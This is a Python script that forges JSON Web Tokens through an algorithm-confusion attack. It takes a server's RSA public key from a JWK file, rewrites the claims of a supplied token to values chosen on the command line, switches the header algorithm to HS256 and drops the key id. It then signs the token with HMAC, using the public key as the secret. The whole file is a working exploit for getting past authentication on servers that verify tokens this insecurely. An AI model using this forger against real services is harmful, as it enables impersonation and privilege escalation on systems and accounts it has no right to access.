import argparse
import hashlib
import json
import jwt
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend
import base64
import chardet
import uuid
import hmac

def main():
    parser = argparse.ArgumentParser(description='Sign a modified JWT with a public key.')
    parser.add_argument('--jwt', type=str, help='The JWT to sign.')
    parser.add_argument('--data', type=str, nargs='+', help='The JSON data to modify and sign.')
    args = parser.parse_args()

    with open('my_jwk_file.json', 'rb') as f:
        jwk_data = f.read()
        encoding = chardet.detect(jwk_data)['encoding']
        jwk = json.loads(jwk_data.decode(encoding))

    pub_key = rsa.RSAPublicNumbers(
        e=int.from_bytes(base64.urlsafe_b64decode(jwk['e'] + '==='), byteorder='big'),
        n=int.from_bytes(base64.urlsafe_b64decode(jwk['n'] + '==='), byteorder='big')
    ).public_key(default_backend())
  

    public_key_b64_encoded = base64.b64encode(pub_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )).decode('utf-8')
    print(f'Public key : {public_key_b64_encoded}')
    
    kid=str(uuid.uuid4())

    jwk = {
        "kty": "oct",
        "kid": kid,
        "k": public_key_b64_encoded
    }
    print(f'Sym key (JWK format): {json.dumps(jwk)}')


    jwt_header = {}
    jwt_payload = {}
    if args.jwt:
        jwt_parts = args.jwt.split('.')
        jwt_header = json.loads(base64.urlsafe_b64decode(jwt_parts[0] + '===').decode('utf-8'))
        jwt_payload = json.loads(base64.urlsafe_b64decode(jwt_parts[1] + '===').decode('utf-8'))

    for item in args.data:
        key, value = item.split('=')
        jwt_payload[key] = value

    jwt_header['alg'] = 'HS256'
 
    jwt_header.pop('kid')

    #jwt_token = jwt.encode(
    #    jwt_payload,
    #    algorithm='HS256',
    #    headers=jwt_header,
    #)
    print(jwt_header)
    print(jwt_payload)
    a=base64.urlsafe_b64encode(json.dumps(jwt_header).encode()).decode('utf-8').strip("=")+'.'+base64.urlsafe_b64encode(json.dumps(jwt_payload).encode()).decode('utf-8').strip("=")
    
    newSig = base64.urlsafe_b64encode(hmac.new(base64.b64decode(public_key_b64_encoded),a.encode(),hashlib.sha256).digest()).decode('UTF-8').strip("=")
    print(f'Signed JWT: {a}.{newSig}')


if __name__ == '__main__':
    main()
